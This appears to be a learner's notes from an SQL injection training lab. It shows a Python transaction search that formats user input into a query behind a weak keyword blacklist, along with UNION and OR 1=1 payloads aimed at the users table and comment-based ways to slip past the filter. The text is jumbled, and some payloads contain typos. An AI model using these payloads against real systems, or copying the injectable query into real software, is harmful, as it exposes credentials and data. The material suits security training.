4ny37(S27@{34!6-E = H/zdp$B(4n2c'7

from database.connect import Connect

class TransactionQuery:
@ staticmethod
def search_transactions(account_id, search_term):
try:
conn=Connect()
cursor=conn.db.cursor()
query="SELECT * FROM Transactions T WHERE T.ownerAccountId = %d" % account_id
if search_term:
if ('UNION' in search_term or 'union' in search_term
or '1 = 1' in search_term):
return []
query += " AND T.description LIKE '%{}%'".format(search_term)

LIVE CODE

help

IN THE LIVE CODE SECTION YOU CAN SEE HOW THE USER INPUT AFFECTS THE VULNERABLE CODE. SEEING IT LIVE MIGHT HELP YOU DISCOVER THE WEAKNESSES.

SELECT *
FROM Transactions T
WHERE T.ownerAccountId=2
AND T.description LIKE '%%' UNION SELECT CASE WHEN username='admin' AND length(passowrd) > 2) Then to_char(1/0) ELSE NULL END FROM users-- %'


if search_term:
if ('UNION' in search_term or 'union' in search_term pr '1=1' in search_term):
return []

This is in place and won’t let me use UNION or 1= 1

but if I use ‘ OR 1= 1 — I see whole data.

But i need to query users table using UNION
I need to try to encode UNION key word let me check

For instance, UNION could be obfuscated as UN/*/ION, U/*/NION, or U % ION.







 return cursor.execute(query).fetchall()

 except Exception:

 return None
